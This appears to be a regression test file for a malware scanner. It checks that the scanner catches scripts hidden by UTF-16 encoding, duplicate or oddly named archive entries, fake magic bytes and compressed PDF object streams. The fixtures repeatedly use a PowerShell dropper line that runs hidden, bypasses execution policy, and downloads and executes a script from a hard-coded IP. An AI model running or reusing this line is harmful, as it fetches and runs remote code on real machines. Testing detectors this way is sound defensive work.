/**
 * Regression tests for scanner blind spots: inputs that used to be skipped,
 * overwritten or mis-read, so that a hostile file could come back "Low".
 * The payload below is an inert command string; nothing is executed.
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { scanFile } from '../src/analyzer/index.mjs';
import { Sandbox } from '../src/analyzer/sandbox.mjs';
import { extractAsar } from '../src/analyzer/extractors.mjs';
import { analyzePdf } from '../src/analyzer/documents.mjs';
import { decodeText } from '../src/analyzer/strings.mjs';
import { detectFileType } from '../src/analyzer/fileType.mjs';
import { toMarkdown } from '../src/analyzer/report.mjs';
import { buildZip, buildAsar } from './fixtures.mjs';

const DROPPER = 'powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://45.137.21.9/a.ps1\')"\r\n';

let dir;
let sandboxRoot;
const opts = () => ({ useRea: false, verifySignature: false, useYara: false, sandboxRoot });
const ids = (r) => new Set(r.findings.map((f) => f.ruleId));
const flagged = (r) => ids(r).has('ps.hidden-bypass') && ['High', 'Critical'].includes(r.verdict.level);

before(async () => {
  dir = await fs.mkdtemp(path.join(os.tmpdir(), 'reap-regress-'));
  sandboxRoot = path.join(dir, 'sandbox');
});
after(async () => {
  await fs.rm(dir, { recursive: true, force: true });
});

/** One ustar header + data block. Written by hand so the name can hold any character. */
function tarEntry(name, data) {
  const header = Buffer.alloc(512);
  header.write(name, 0, 'latin1');
  header.write('0000644\0', 100);
  header.write('0000000\0', 108);
  header.write('0000000\0', 116);
  header.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124);
  header.write('00000000000\0', 136);
  header.write('        ', 148);
  header.write('0', 156);
  header.write('ustar\x0000', 257);
  let sum = 0;
  for (const b of header) sum += b;
  header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148);
  return Buffer.concat([header, data, Buffer.alloc((512 - (data.length % 512)) % 512)]);
}

test('UTF-16 scripts are decoded before the rules run', async () => {
  assert.equal(decodeText(Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('héllo', 'utf16le')])), 'héllo');
  assert.equal(decodeText(Buffer.concat([Buffer.from([0xfe, 0xff]), Buffer.from('hello', 'utf16le').swap16()])), 'hello');
  assert.equal(decodeText(Buffer.from('plain text without a byte-order mark', 'utf16le')), 'plain text without a byte-order mark');
  assert.equal(decodeText(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('utf8')])), 'utf8');
  assert.equal(decodeText(Buffer.from('ascii')), 'ascii');

  const withBom = path.join(dir, 'bom.ps1');
  await fs.writeFile(withBom, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(DROPPER, 'utf16le')]));
  assert.ok(flagged(await scanFile(withBom, opts())), 'UTF-16LE script with BOM');

  const noBom = path.join(dir, 'nobom.bat');
  await fs.writeFile(noBom, Buffer.from(DROPPER, 'utf16le'));
  assert.ok(flagged(await scanFile(noBom, opts())), 'UTF-16LE script without BOM');

  // Without a script extension the file is still recognised as text, not as a binary blob.
  const note = path.join(dir, 'readme.txt');
  await fs.writeFile(note, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(DROPPER, 'utf16le')]));
  assert.equal((await detectFileType(note)).kind, 'text');
});

test('ZIP entries with the same name are all kept and scanned', async () => {
  const p = path.join(dir, 'dup.zip');
  await fs.writeFile(p, buildZip([
    { name: 'run.ps1', data: DROPPER },
    { name: 'RUN.ps1', data: 'Write-Host "hello"\r\n' },
    { name: 'run.ps1', data: 'Write-Host "again"\r\n' },
  ]));
  const r = await scanFile(p, opts());
  assert.equal(r.files.filter((f) => f.depth === 1).length, 3, 'three separate files');
  assert.equal(new Set(r.files.map((f) => f.rel)).size, r.files.length, 'unique report names');
  assert.ok(flagged(r), 'the first (hidden) entry was analysed');
});

test('ASAR entries that collide on disk are kept under separate names', async () => {
  const p = path.join(dir, 'collide.asar');
  await fs.writeFile(p, buildAsar({ 'a.js': 'first', 'CON.js': 'second', '_CON.js': 'third' }));
  const sb = await new Sandbox({ root: sandboxRoot }).init();
  try {
    const res = await extractAsar(p, path.join(sb.dir, 'out'), sb);
    assert.equal(res.files.length, 3);
    assert.equal(new Set(res.files.map((f) => f.toLowerCase())).size, 3, 'no two entries share a path');
    const contents = await Promise.all(res.files.map((f) => fs.readFile(f, 'utf8')));
    assert.deepEqual(contents.sort(), ['first', 'second', 'third']);
  } finally {
    await sb.cleanup();
  }
});

test('TAR entries with Windows-reserved characters are not dropped', async () => {
  const p = path.join(dir, 'odd.tar');
  await fs.writeFile(p, Buffer.concat([tarEntry('evil?.ps1', Buffer.from(DROPPER)), tarEntry('sub/a:b.ps1', Buffer.from(DROPPER)), Buffer.alloc(1024)]));
  const r = await scanFile(p, opts());
  assert.equal(r.files.filter((f) => f.depth === 1).length, 2, 'both entries are in the inventory');
  assert.ok(flagged(r));
});

test('scripts hidden behind archive or MZ magic bytes are still analysed', async () => {
  for (const [name, prefix] of [['cpio.bat', '070701\r\n'], ['cab.cmd', 'MSCF\r\n'], ['mz.bat', 'MZ\r\n'], ['zip.ps1', 'PK\x03\x04\r\n']]) {
    const p = path.join(dir, name);
    await fs.writeFile(p, prefix + DROPPER);
    const r = await scanFile(p, opts());
    assert.ok(flagged(r), `${name}: ${[...ids(r)].join(', ')} (${r.verdict.level})`);
  }
  // A corrupt archive with no text in it must still not crash or be treated as a script.
  const junk = path.join(dir, 'junk.7z');
  await fs.writeFile(junk, Buffer.concat([Buffer.from('377abcaf271c', 'hex'), Buffer.alloc(256, 0xff)]));
  const r = await scanFile(junk, opts());
  assert.equal(r.files[0].analyzedAs, 'binary');
});

test('text that merely contains "-lh" is not taken for an LZH archive', async () => {
  const script = path.join(dir, 'list.sh');
  await fs.writeFile(script, 'ls-lh /tmp\n');
  assert.equal((await detectFileType(script)).kind, 'script');
  const lzh = path.join(dir, 'real.lzh');
  await fs.writeFile(lzh, Buffer.concat([Buffer.from([0x20, 0x00]), Buffer.from('-lh5-'), Buffer.alloc(32)]));
  assert.equal((await detectFileType(lzh)).kind, 'lzh');
});

test('PDF names inside compressed object streams are counted', () => {
  const objects = zlib.deflateSync(Buffer.from('1 0 2 60 << /Type /Catalog /OpenAction 2 0 R >> << /S /JavaScript /JS (app.alert(1)) >>'));
  const pdf = Buffer.concat([
    Buffer.from(`%PDF-1.5\n5 0 obj\n<< /Type /ObjStm /N 2 /First 10 /Filter /FlateDecode /Length ${objects.length} >>\nstream\n`),
    objects,
    Buffer.from('\nendstream\nendobj\n%%EOF\n'),
  ]);
  const found = new Set(analyzePdf(pdf).findings.map((f) => f.ruleId));
  for (const id of ['pdf.javascript', 'pdf.open-action', 'pdf.auto-js']) assert.ok(found.has(id), `missing ${id}`);
});

test('PDF: escaped spaces are normal, escaped letters are obfuscation', () => {
  const rule = (text) => analyzePdf(Buffer.from(text)).findings.some((f) => f.ruleId === 'pdf.obfuscated-names');
  assert.equal(rule('%PDF-1.4\n1 0 obj\n<< /BaseFont /Times#20New#20Roman /Name /A#2FB >>\nendobj\n'), false);
  assert.equal(rule('%PDF-1.4\n1 0 obj\n<< /S /J#61vaScript /JS (x) >>\nendobj\n'), true);
});

test('report counts and Markdown rendering', async () => {
  const empty = path.join(dir, 'empty-folder');
  await fs.mkdir(empty);
  const folder = await scanFile(empty, opts());
  assert.equal(folder.archive.extractedFiles, 0, 'an empty folder has zero extracted files, not -1');
  const md = toMarkdown(folder);
  assert.ok(!md.includes('| ``'), 'missing hashes are not rendered as empty code spans');

  const p = path.join(dir, 'ticks.zip');
  await fs.writeFile(p, buildZip([{ name: 'a``b`c.ps1', data: DROPPER }]));
  const r = await scanFile(p, opts());
  assert.equal(r.archive.extractedFiles, 1);
  assert.ok(toMarkdown(r).includes('``` ticks.zip!/a``b`c.ps1 ```'), 'code fence is longer than any backtick run in the name');
});
